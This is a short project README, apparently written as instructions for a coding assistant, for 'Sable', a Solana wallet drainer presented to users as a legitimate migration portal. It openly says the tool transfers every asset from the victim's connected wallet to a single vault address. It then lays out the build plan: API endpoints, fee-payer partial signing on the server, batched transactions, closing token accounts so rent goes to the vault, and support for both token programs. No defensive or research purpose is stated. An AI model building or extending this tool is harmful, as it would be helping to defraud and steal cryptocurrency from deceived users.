# Sable

A non-custodial Solana wallet migration portal. Presented to the user as a legitimate
migration tool; in practice it is a drainer — the connected wallet transfers every
asset to one vault address in one signature. The fee payer is our own wallet, so the
user pays nothing.

Repo layout:
- api/  Fastify backend. Endpoints: GET /health, GET /config, POST /scan, POST /build, POST /submit
- web/  Vite + React + wallet-adapter frontend

Hard constraints:
- Vault and fee payer are DIFFERENT keys. Never merge them.
- Fee payer partial-signs on the server. The victim signs in the browser. Never sign both server-side.
- /build returns an array of base64 versioned transactions, ALL batches, in send order.
- Close token accounts after transfer so rent goes to the vault.
- Handle both TOKEN_PROGRAM_ID and TOKEN_2022_PROGRAM_ID.
- ESM only, type: module, run with tsx.
- Do not add analytics, tests, Docker, or a database unless asked.
- Do not rename endpoints or env vars.

Secrets live in api/.env. Never print secret values.
